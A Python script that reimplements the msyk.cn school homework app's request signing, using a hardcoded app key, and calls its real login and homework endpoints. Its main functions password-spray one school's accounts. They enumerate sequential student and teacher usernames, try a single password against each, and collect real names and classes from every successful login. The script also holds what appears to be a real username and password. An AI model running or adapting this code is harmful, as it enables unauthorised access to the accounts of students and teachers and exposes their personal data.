import hashlib
import json
import requests
import time
from colorama import init, Fore, Style

SUBJECT_COLORS = {
    '政治': Fore.YELLOW,
    '历史': Fore.CYAN,
    '语文': Fore.LIGHTWHITE_EX,
    '数学': Fore.LIGHTRED_EX,
    '英语': Fore.LIGHTGREEN_EX,
    '语音': Fore.LIGHTGREEN_EX,
    '物理': Fore.LIGHTMAGENTA_EX,
    '化学': Fore.LIGHTBLUE_EX,
    '生物': Fore.LIGHTCYAN_EX,
    '地理': Fore.LIGHTYELLOW_EX,
    '体育与健康': Fore.LIGHTRED_EX,
    '通用(选考)': Fore.BLUE,
    '通用(学考)': Fore.LIGHTBLUE_EX,
    '信息(选考)': Fore.MAGENTA,
    '信息(学考)': Fore.LIGHTMAGENTA_EX,
    # 默认颜色
    '其他': Fore.LIGHTYELLOW_EX
}

msyk_sign_pubkey = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAj7YWxpOwulFyf+zQU77Y2cd9chZUMfiwokgUaigyeD8ac5E8LQpVHWzkm+1CuzH0GxTCWvAUVHWfefOEe4AThk4AbFBNCXqB+MqofroED6Uec1jrLGNcql9IWX3CN2J6mqJQ8QLB/xPg/7FUTmd8KtGPrtOrKKP64BM5cqaB1xCc4xmQTuWvtK9fRei6LVTHZyH0Ui7nP/TSF3PJV3ywMlkkQxKi8JBkz1fx1ZO5TVLYRKxzMQdeD6whq+kOsSXhlLIiC/Y8skdBJmsBWDMfQXxtMr5CyFbVMrG+lip/V5n22EdigHcLOmFW9nnB+sgiifLHeXx951lcTmaGy4uChQIDAQAB"
msyk_key = "DxlE8wwbZt8Y2ULQfgGywAgZfJl82G9S"
headers = {'user-agent': "okhttp/3.12.1"}
sign_a = ""
countStu = 0


init(autoreset=True)
defultUserList = []

def getCurrentTime():
    return int(round(time.time() * 1000))

def post1(url, postdata, type=1, extra=''):
    time = getCurrentTime()
    key = ''
    if type == 1:
        key = string_to_md5(extra + str(time) + sign_a + msyk_key)
    elif type == 2:
        key = string_to_md5(extra + id_a + unitId_a + str(time) + sign_a + msyk_key)
    elif type == 3:
        key = string_to_md5(extra + unitId_a + id_a + str(time) + sign_a + msyk_key)
    elif type == 4:
        key = string_to_md5(extra + str(time) + " " + msyk_key)
    elif type == 5:
        key = string_to_md5(id_a + extra + unitId_a + str(time) + sign_a + msyk_key)
    postdata.update({'salt': time, 'sign': sign_a, 'key': key})
    try:
        req = requests.post(url=url, data=postdata, headers=headers)
        return req.text
    except BaseException:
        print(Fore.RED + str(url) + " " + str(postdata))
        print(Fore.RED + "网络异常 请检查代理设置")
        exit(1)

def getUpgrade1():
    dataup={"version":"8.0.26.0","patchCode":0}
    res = post1("https://padapp.msyk.cn/ws/systemOptions/apkUpgrade",dataup,4,"8.0.26.00")
    print(res)

def getSubjectInfo1():
    dataup = {"studentId": id_a, "unitId": unitId_a}
    res = post1("https://padapp.msyk.cn/ws/student/homework/studentHomework/searchSubjectInfo", dataup, 2, " ")
    if res.strip():
        try:
            infoList = json.loads(res).get('studentSubjectList')
        except json.JSONDecodeError as e:
            print("JSON格式错误:", e)
    for item in infoList:
        print(
            str(item['code']) + " " + Fore.YELLOW + "[" +
            item['name'] + "]" + " " + Fore.WHITE +
            item['teacherName'] + " " +
            item['userId']
        )

def getHistoryHomework1():
    dataup={"studentId":id_a,"subjectCode":None,"homeworkType":-1,"pageIndex":1,"pageSize":500,"statu":4,"startTime":None,"endTime":None,"homeworkName":None,"unitId":unitId_a}
    res = post1("https://padapp.msyk.cn/ws/student/homework/studentHomework/getHomeworkList", dataup, 2, "-11500-1")
    #dataupp = {"studentId": id, "subjectCode": None, "homeworkType": -1, "pageIndex": 1, "pageSize": 36, "statu": 4, "startTime": None, "homeworkName": None, "unitId": unitId}
    #req = post("https://padapp.msyk.cn/ws/student/homework/studentHomework/getHistoryHomeworkList",dataupp, 2, "-11364")
    #print(req)
    if res.strip():
        try:
            reslist = json.loads(res).get('sqHomeworkDtoList')  # 作业list
        except json.JSONDecodeError as e:
            print("JSON格式错误:", e)
    count = 1
    for item in reslist:
        timeArrayEnd = time.localtime((item['endTime']) / 1000)
        timeArrayStart = time.localtime((item['startTime']) / 1000)
        timeNow = getCurrentTime() / 1000
        statu = " "
        if int((item['startTime']) / 1000) > int(timeNow):
            statu = Fore.RED + "未开始"
        elif int((item['endTime']) / 1000) < int(timeNow):
            statu = Fore.WHITE + "已结束"
        else:
            statu = Fore.GREEN + "已开始"
        # TC = (item['endTime'])
        # print(TC)
        timePrintEnd = time.strftime("%Y-%m-%d %H:%M:%S", timeArrayEnd)
        timePrintStart = time.strftime("%Y-%m-%d %H:%M:%S", timeArrayStart)
        print(
            statu + " " +
            Fore.YELLOW + str(count) + " " +
            Fore.RED + str(item['id']) +
            Fore.YELLOW + " 作业类型:" + str(
                item['homeworkType']) + " " + Style.BRIGHT + Fore.LIGHTWHITE_EX + "[" + str(
                item['subjectName']) + "]" + Style.NORMAL + Fore.YELLOW + " " + (
            item['homeworkName']) +
            Fore.GREEN + " 开始时间:" + Fore.BLUE + timePrintStart + Fore.GREEN + " 截止时间:" + Fore.BLUE + timePrintEnd
        )
        count += 1

def login1(userName_a,password_a):
    genauth = string_to_md5(userName_a + password_a + "HHOO")
    dataup = {"userName": userName_a,"auth": genauth}
    res = post1("https://padapp.msyk.cn/ws/app/padLogin",dataup, 1, genauth + userName_a)
    #print(res)
    outputInform(res, userName_a)

def string_to_md5(string):
    md5_val = hashlib.md5(string.encode('utf8')).hexdigest()
    return md5_val

def outputInform(res, userName_a):
    if json.loads(res).get('code') == "10000":
        global unitId_a, id_a, countStu
        unitId_a = json.loads(res).get('InfoMap').get('unitId')
        id_a = json.loads(res).get('InfoMap').get('id')
        realName = json.loads(res).get('InfoMap').get('realName')
        if json.loads(res).get('InfoMap').get('userType') == 1:
            groupName = json.loads(res).get('InfoMap').get('groupName')
            output = userName_a + " " + str(groupName) + " " + str(realName)
            countStu += 1
        else:
            output = userName_a + " " + str(realName)
        print(Fore.GREEN + "登录成功: " + str(output))
        defultUserList.append(output)
    else:
        message = json.loads(res).get('message')
        print(Fore.RED + "登录失败: " + userName_a + " " + message)

def tryStuPwd(password_a):
    classID = 202301
    userNum = 0
    while classID <= 202313:
        while userNum <= 60:
            if len(str(userNum)) == 1:
                userName_a = "sdfz" + str(classID) + "0" + str(userNum)
            else:
                userName_a = "sdfz" + str(classID) + str(userNum)
            login1(userName_a,password_a)
            userNum += 1
        userNum = 0
        classID += 1

def tryTechPwd(password_a):
    techNum = 180000
    while techNum <= 180256:
        userName_a = "sdfz" + str(techNum)
        login1(userName_a,password_a)
        techNum += 1

# roll = 1
# while roll == 1:
def passwordTryMain():
    userType = input("userType: ")
    password_a = input("pwd: ")
    if userType == "1":
        tryStuPwd(password_a)
        print("共计" + str(countStu) + "人")
        print(defultUserList)
    else:
        tryTechPwd(password_a)
        print(defultUserList)
    
def passwordTryTest():
    password_a = "fz1234567"
    username_a = "sdfz20230726"
    login1(username_a, password_a)
    getSubjectInfo1()
    getHistoryHomework1()
    getUpgrade1()


    

